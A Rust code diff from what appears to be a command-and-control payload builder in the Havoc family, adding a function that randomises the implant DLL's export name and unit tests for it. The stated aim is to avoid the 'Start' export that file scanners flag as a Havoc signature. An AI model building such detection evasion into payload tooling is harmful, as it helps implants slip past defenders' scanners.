@@ -130,6 +130,29 @@ pub(super) fn generate_archon_magic() -> Result<(String, u32), PayloadBuildError
     }
 }
 
+/// Generate a random Archon DLL export name and return the corresponding `-D`
+/// define string together with the identifier itself.
+///
+/// The identifier has the form `Arc<16 random hex digits>` (e.g. `Arc3f8b1a…`)
+/// which is always a valid C identifier regardless of compiler flags.  The
+/// define is injected as `-DDEMON_EXPORT_NAME=<id>` so the C compiler sets the
+/// DLL export name in `MainDll.c` to the generated identifier rather than the
+/// well-known `Start` name that is flagged by file scanners as a Havoc signature.
+///
+/// The returned identifier string is stored in the `PayloadArtifact` so the
+/// payload generator can record which export to invoke.
+pub(super) fn generate_archon_export_name() -> Result<(String, String), PayloadBuildError> {
+    let mut bytes = [0u8; 8];
+    getrandom::fill(&mut bytes).map_err(|e| PayloadBuildError::ToolchainUnavailable {
+        message: format!("failed to generate random Archon export name: {e}"),
+    })?;
+    let hex: String = bytes.iter().map(|b| format!("{b:02x}")).collect();
+    let identifier = format!("Arc{hex}");
+    let define = format!("DEMON_EXPORT_NAME={identifier}");
+    validate_define(&define)?;
+    Ok((define, identifier))
+}
+
 /// Build the `-D` defines injected into the staged shellcode stager template.
 ///
 /// Only HTTP listeners are supported: the stager makes an outbound HTTP(S) GET
@@ -862,5 +885,44 @@ mod tests {
             "expected 32 byte values in define, got {count}; define: {key_define}"
         );
         Ok(())
+    }
+
+    // ── generate_archon_export_name tests ─────────────────────────────────────
+
+    #[test]
+    fn generate_archon_export_name_produces_valid_c_identifier() {
+        let (define, name) = generate_archon_export_name().expect("should not fail");
+        // Identifier must start with a letter (C standard).
+        let first = name.chars().next().expect("identifier must be non-empty");
+        assert!(first.is_ascii_alphabetic(), "identifier must start with a letter; got: {name}");
+        // All remaining characters must be alphanumeric or underscore.
+        assert!(
+            name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
+            "identifier contains invalid characters: {name}"
+        );
+        // Define must be `DEMON_EXPORT_NAME=<identifier>`.
+        assert_eq!(define, format!("DEMON_EXPORT_NAME={name}"));
+    }
+
+    #[test]
+    fn generate_archon_export_name_has_arc_prefix() {
+        let (_define, name) = generate_archon_export_name().expect("should not fail");
+        assert!(name.starts_with("Arc"), "export name should start with 'Arc'; got: {name}");
+    }
+
+    #[test]
+    fn generate_archon_export_name_is_unique_across_calls() {
+        let (_d1, n1) = generate_archon_export_name().expect("call 1");
+        let (_d2, n2) = generate_archon_export_name().expect("call 2");
+        // Two independent calls should produce different identifiers (with overwhelming probability).
+        assert_ne!(n1, n2, "two export name generations returned the same identifier");
+    }
+
+    #[test]
+    fn generate_archon_export_name_never_equals_start() {
+        for _ in 0..100 {
+            let (_define, name) = generate_archon_export_name().expect("should not fail");
+            assert_ne!(name, "Start", "export name must not be the well-known 'Start' identifier");
+        }
     }
 }
